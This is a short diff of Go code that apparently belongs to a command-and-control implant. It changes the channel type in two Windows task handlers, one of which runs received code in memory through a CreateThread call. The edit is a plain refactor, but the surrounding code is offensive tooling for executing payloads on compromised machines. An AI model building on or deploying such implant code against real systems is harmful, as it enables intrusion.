@@ -37,7 +37,7 @@ func getSystemHandlers() map[string]interface{} {
 
 // ---------------- Windows Handlers ----------------
 
-func taskHandler(send chan pb.Envelope, data []byte) {
+func taskHandler(send chan *pb.Envelope, data []byte) {
 	task := &pb.Task{}
 	err := proto.Unmarshal(data, task)
 	if err != nil {
@@ -59,7 +59,7 @@ func taskHandler(send chan pb.Envelope, data []byte) {
 	createThread.Call(0, 0, addr, 0, 0, 0)
 }
 
-func remoteTaskHandler(send chan pb.Envelope, data []byte) {
+func remoteTaskHandler(send chan *pb.Envelope, data []byte) {
 	remoteTask := &pb.RemoteTask{}
 	err := proto.Unmarshal(data, remoteTask)
 	if err != nil {
